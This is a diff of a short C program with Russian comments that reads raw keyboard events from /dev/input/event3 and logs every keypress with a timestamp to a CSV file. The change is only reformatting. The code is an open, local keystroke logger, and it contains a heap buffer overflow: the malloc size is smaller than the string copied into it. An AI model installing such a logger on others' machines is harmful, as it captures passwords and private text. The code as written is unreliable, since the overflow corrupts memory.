@@ -15,34 +15,34 @@ void INThandler(){
     exit(0);
 }
 
-int main()
-{
-        FILE *fptr = fopen("keyhistory.csv", "a");
-        int device = open("/dev/input/event3", O_RDONLY);
-        struct input_event ev;
+int main(){
+	FILE *fptr = fopen("keyhistory.csv", "a");
+	int device = open("/dev/input/event3", O_RDONLY);
+	struct input_event ev;
+	
+	signal(SIGINT, INThandler);
 
-		signal(SIGINT, INThandler);
-
-		const char* newKeys[KEY_MAX + 1]; // массив нормальных названий клавиш (без KEY_)
-		for (int i = 0; i < KEY_MAX; i++){
-			if (keys[i] != NULL){
-				int sz = strlen(keys[i]);
-				char *text = (char*) malloc((sz-3)*sizeof(char));
-				strcpy(text, keys[i]);
-				memmove(text, text+4, sz-4); // двигаем на 4 символа вперед (обрезаем KEY_)
-				text[sz-4] = '\0';
-				newKeys[i] = text;
-			}
+	const char* newKeys[KEY_MAX + 1]; // массив нормальных названий клавиш (без KEY_)
+	for (int i = 0; i < KEY_MAX; i++){
+		if (keys[i] != NULL){
+			int sz = strlen(keys[i]);
+			char *text = (char*) malloc((sz-3)*sizeof(char));
+			strcpy(text, keys[i]);
+			memmove(text, text+4, sz-4); // двигаем на 4 символа вперед (обрезаем KEY_)
+			text[sz-4] = '\0';
+			newKeys[i] = text;
 		}
+	}
+	
+	while(1){
 
-        while(1)
-        {
-                read(device, &ev, sizeof(ev));
-                if(ev.type == 1 && ev.value == 1){ // принимаем только keypress 
-                    fprintf(fptr, "%d,%s\n", ev.time.tv_sec, newKeys[ev.code]);
-					fflush(fptr); // сразу же записываем нажатие в цсв
-                }
-        }
+		read(device, &ev, sizeof(ev));
+
+		if(ev.type == 1 && ev.value == 1){ // принимаем только keypress 
+			fprintf(fptr, "%d,%s\n", ev.time.tv_sec, newKeys[ev.code]);
+			fflush(fptr); // сразу же записываем нажатие в цсв
+		}
+	}
 }
 
 // переписываем /usr/include/linux/input-event-codes.h в обратную сторону (код взят из evtest)
